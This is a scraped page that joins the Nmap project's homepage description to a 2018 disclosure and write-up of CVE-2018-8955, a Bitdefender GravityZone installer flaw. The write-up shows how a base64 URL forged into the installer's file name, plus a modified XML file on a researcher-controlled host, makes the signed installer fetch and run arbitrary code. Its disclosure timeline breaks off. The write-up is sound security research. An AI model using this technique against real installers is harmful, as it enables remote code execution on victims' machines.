# Nmap: Discover your network

Nmap ("Network Mapper") is a
[free and open source](/npsl/) utility for
network discovery and security auditing. Many systems and network
administrators also find it useful for tasks such as network
inventory, managing service upgrade schedules, and monitoring host or
service uptime. Nmap uses raw IP packets in novel ways to determine
what hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other characteristics. It
was designed to rapidly scan large networks, but works fine against
single hosts. Nmap runs on all major computer operating systems, and
official binary packages are available for Linux, Windows, and Mac OS
X. In addition to the classic command-line Nmap executable, the Nmap
suite includes an advanced GUI and results viewer
([Zenmap](/zenmap/)), a flexible data
transfer, redirection, and debugging tool
([Ncat](/ncat/)), a utility for
comparing scan results ([Ndiff](/ndiff/)), and a packet generation and response analysis tool ([Nping](/nping/)).

Nmap was named “Security Product of the Year” by Linux
Journal, Info World, LinuxQuestions.Org, and Codetalker Digest. It
was even featured in [twelve
movies](/movies/), including
[The Matrix Reloaded](/movies/#matrix),
[Die Hard 4](/movies/#diehard4),
[Girl With the Dragon Tattoo](/movies/#gwtdt),
and
[The Bourne Ultimatum](/movies/#bourne).

Nmap is ...

* Nmap
  Security
  Port Scanner
* **Flexible**: Supports dozens of advanced techniques for
  mapping out networks filled with IP filters, firewalls, routers, and
  other obstacles. This includes many [port scanning](/book/man-port-scanning-techniques.html) mechanisms (both TCP &
  UDP), [OS
  detection](/book/osdetect.html), [version detection](/book/vscan.html), ping sweeps, and more. See the [documentation page](/docs.html).* **Powerful**: Nmap has been used to scan huge networks of
    literally hundreds of thousands of machines.* **Portable**: Most operating systems are supported, including
      Linux,
      Microsoft Windows,
      FreeBSD,
      OpenBSD,
      Solaris,
      IRIX,
      Mac OS X,
      HP-UX,
      NetBSD,
      Sun OS,
      Amiga,
      and more.* **Easy**: While Nmap offers a rich set of advanced features for
        power users, you can start out as simply as "nmap -v -A *targethost*". Both traditional command line and graphical (GUI)
        versions are available to suit your preference. Binaries are
        available for those who do not wish to compile Nmap from source.* **Free**: The primary goals of the Nmap Project is to help make
          the Internet a little more secure and to provide
          administrators/auditors/hackers with an advanced tool for exploring
          their networks. Nmap is available for [free download](https://nmap.org/download.html), and also comes with full
          source code that you may modify and redistribute under the terms of
          the [license](data/COPYING).* **Well Documented**: Significant effort has been put into
            comprehensive and up-to-date man pages, whitepapers, tutorials, and
            even a whole book! Find them in multiple
            languages [here](/docs.html).* **Supported**: While Nmap comes with no warranty, it is well supported by a vibrant community of developers and users. Most of this interaction occurs on the [Nmap mailing lists](#lists). Most bug reports and questions should be sent to the [nmap-dev list](https://seclists.org/nmap-dev), but only after you read the [guidelines](/book/man-bugs.html). We recommend that all users subscribe to the low-traffic [nmap-hackers](https://seclists.org/nmap-hackers) announcement list. You can also find Nmap on [Facebook](http://facebook.com/nmap) and [Twitter](http://twitter.com/nmap). For real-time chat, join the #nmap channel on [Freenode](http://freenode.net/) or [EFNet](http://www.efnet.org/).* **Acclaimed**: Nmap has won numerous awards, including
                "Information Security Product of the Year" by Linux Journal, Info
                World and Codetalker Digest. It has been featured in hundreds of
                magazine articles, several movies, dozens of books, and one comic book
                series. Visit the [press page](nmap_inthenews.html)
                for further details.* **Popular**: Thousands of people download Nmap every day, and
                  it is included with many operating systems (Redhat Linux, Debian
                  Linux, Gentoo, FreeBSD, OpenBSD, etc). It is among the top ten (out of
                  30,000) programs at the Freshmeat.Net repository. This is important
                  because it lends Nmap its vibrant development and user support
                  communities.

## Communication

Nmap users are encouraged to subscribe to the *Nmap-hackers*
mailing list. It is a low volume (6 posts in 2017), moderated list
for the most important announcements about Nmap, Insecure.org, and
related projects. You can join more than 128,000 current subscribers
by submitting your email address here:

(or subscribe with custom options from the [Nmap-hackers list info page](https://nmap.org/mailman/listinfo/announce))

We also have a development list for more hardcore members
(especially programmers) who are interested in helping the project by
helping with coding, testing, feature ideas, etc. New (test/beta)
versions of Nmap are sometimes released here prior to general
availability for QA purposes. You can subscribe at the [Nmap-dev list
info page](https://nmap.org/mailman/listinfo/dev).

Both lists are archived (along with many other security lists) at [Seclists.org](https://seclists.org).

Though it isn't nearly as active as the mailing lists, the official IRC channel is #nmap on [Freenode](http://freenode.net/) (irc.freenode.net).

# CVE-2018-8955: Bitdefender GravityZone Arbitrary Code Execution

---

*From*: Kyriakos Economou <kyrecon () anti-reversing com>

*Date*: Mon, 22 Oct 2018 16:01:48 +0300

---

We recently identified a vulnerability in the digitally signed
Bitdefender GravityZone installer.
```

```
The vulnerability allows an attacker to execute malicious code without
breaking the original digital signature, and without embedding anything
malicious into the installer itself.
```

```
This means that an appropriately positioned attacker can cause the
signed installer to run an arbitrary remotely hosted executable.
```

```
For more information regarding these issues please visit:
<https://labs.nettitude.com/blog/cve-2018-8955-bitdefender-gravityzone-arbitrary-code-execution/>
```

Cheers,
kyREcon

# CVE-2018-8955: Bitdefender GravityZone Arbitrary Code Execution

Kyriakos Economou

Senior R&D team member at Nettitude.

16 Oct 2018

We recently identified a vulnerability in the digitally signed Bitdefender GravityZone installer. The vulnerability allows an attacker to execute malicious code without breaking the original digital signature, and without embedding anything malicious into the installer itself. This means that an appropriately positioned attacker can cause the signed installer to run an arbitrary remotely hosted executable.

We consider this to be a vulnerability worthy of analysis because of the way that it works. It is a good example of how developer creativity can bypass otherwise robust security controls.

# You can base64 but you can’t hide

Earlier this year, we noticed a tweet about some AV comparison results that prompted us to download an evaluation copy of the Bitdefender GravityZone installer.
The installation is done via a digitally signed executable of about 3.4 MB. We downloaded the installer in a VM, verified the digital signatures, and then noticed an eye-catching file name that caused us to pause. The filename was of the following format:

* *setupdownloader\_[base64\_string].exe*

That was slightly odd, so we decided to find out what that base64 string was used for.  The actual filename of the executable was:

* *setupdownloader\_[aHR0cHM6Ly9jbG91ZGd6LWVjcy5ncmF2aXR5em9uZS5iaXRkZWZlbmRlci5jb20vUGFja2FnZXMvQlNUV0lOLzAvXzlKWkJNL2luc3RhbGxlci54bWw-bGFuZz1lbi1VUw==].exe*

The base64 string decoded to:

* https://cloudgz-ecs.gravityzone.bitdefender.com/Packages/BSTWIN/0/\_9JZBM/installer.xmlxFFlang=en-US

# Digging deeper

This was a URL to an XML file, which was interesting enough to prompt us to dig a little deeper. What would happen if we replaced the base64 string with one that points to an XML file controlled by us?
We changed the filename to:

* *setupdownloader\_[aHR0cDovL3RoaXNjYW50YmV0cnVlLmNvbS9pbnN0YWxsZXIueG1s].exe”*

The base64 in that filename was modified to contain the URL:

* http://thiscantbetrue.com/installer.xml

We reran the installer and the results are shown below.
![](/globalassets/cyber-labs/cve-2018-8955-bitdefender-gravityzone-arbitrary-code-execution/word-image.png?epslanguage=en)

```
<downloadUrl strVar="DownloadUrl">
    <![CDATA[https://cloudgz-ecs.gravityzone.bitdefender.com/Packages/BSTWIN/0]]>
</downloadUrl>
```

We replaced that entry with:

```
<downloadUrl strVar="DownloadUrl">
    <![CDATA[http://thiscantbetrue.com/Packages/BSTWIN/0]]>
</downloadUrl>
```

We then copied the modified XML file over to our HTTP server.
What we had at that point was the signed GravityZone installer that now contained a URL in base64 that in turn pointed to an XML file under our control. The modified XML file had a new *downloadUrl*entry which pointed to our HTTP server.

# Going one step further

We ran the installer again, this time with the modified base64 string and subsequently modified XML file. That gave us the following error message:
![](/globalassets/cyber-labs/cve-2018-8955-bitdefender-gravityzone-arbitrary-code-execution/word-image-1.png?epslanguage=en)
We consequently fired up Wireshark and found the HTTP request that was giving us problems:

```
GET /Packages/BSTWIN/0/win32/data.xml?fakeparam=17868162 HTTP/1.1
Connection: Keep-Alive
Cookie: BDWSCookie=; cuid=97884EFF3A259DAAA3834C611C9036AA; suid=; puid=0; sys=30; cuidsn=58B38288E6A010B18F57AAAAB0DAF650; cuidsn3=054CE1615250644F8714BB094499BF84; cuidsn4_=C0847A401883E0D665F16B71ABC04F05;
User-Agent: EPSInstaller-Agent (WSLib 1.4 [3, 0, 0, 168])
Host: thiscantbetrue.com
```

We were missing an extra sub-directory named *win32,* and on top of that we noticed that the setup was looking for another XML file, which we didn’t yet have. Note that our guest OS was 32-bit, and for that reason the installer was looking for the 32-bit modules on the remote server.
We had to identify the structure and contents of the *data.xml* file that the setup was looking for, and the easiest way to find that out was to allow it to contact the original server.
At this point, we used a simple trick to skip looking at encrypted data passing over HTTPS, and so we restored the original download URL back to the installer.xml, but we replaced HTTPS with HTTP instead.
Consequently, we obtained the contents of the *data.xml* file by locating the relevant HTTP request:

```
GET /Packages/BSTWIN/0/win32/data.xml?fakeparam=19832787 HTTP/1.1
Connection: Keep-Alive
Cookie: BDWSCookie=; cuid=97884EFF3A259DAAA3834C611C9036AA; suid=; puid=0; sys=30; cuidsn=58B38288E6A010B18F57AAAAB0DAF650; cuidsn3=054CE1615250644F8714BB094499BF84; cuidsn4_=C0847A401883E0D665F16B71ABC04F05;
User-Agent: EPSInstaller-Agent (WSLib 1.4 [3, 0, 0, 168])
Host: cloudgz-ecs.gravityzone.bitdefender.com
```

Of course, you could also just download that file by using your web browser. ![🙂](https://s.w.org/images/core/emoji/14.0.0/svg/1f642.svg)

# Putting everything together

The *data.xml* file contained a list of the files that will be downloaded. The following image shows a few of them.
![](/globalassets/cyber-labs/cve-2018-8955-bitdefender-gravityzone-arbitrary-code-execution/word-image-2.png?epslanguage=en)
The file ended with the final command to be executed, which essentially instructed the setup application to execute one of the downloaded files called “Installer.exe”: *<run\_command params=”” proc=”Installer.exe” />*
As you can see, the setup application blindly trusted the *installer.xml* file and subsequently the information provided by the downloaded *data.xml* file.
In other words, we could change that list and the setup application would download and execute a file of our choice, as long as we also provided the correct MD5 hash for it, which of course was not an issue.
To make things worse, an attacker could set up a server with all the legitimate files and just add an extra executable and/or DLL module to the list. This would allow the installation to progress as expected, while silently performing malicious activity on the target system.

# Conclusion

We believe that there is a lot that developers can learn from this vulnerability:

* You must never blindly trust a binary just because it is digitally signed.
* Even robust security measures can be compromised by subsequently poor implementations.
* A digital signature can ensure that a file has not been tampered with, but this does not include the filename.

As remediation for this vulnerability, Bitdefender released new patched installers and went through a certificate revocation process of the affected certificates.

# Disclosure Timeline

Bitdefender were very responsive throughout the disclosure process. A timeline of key dates are as follows:
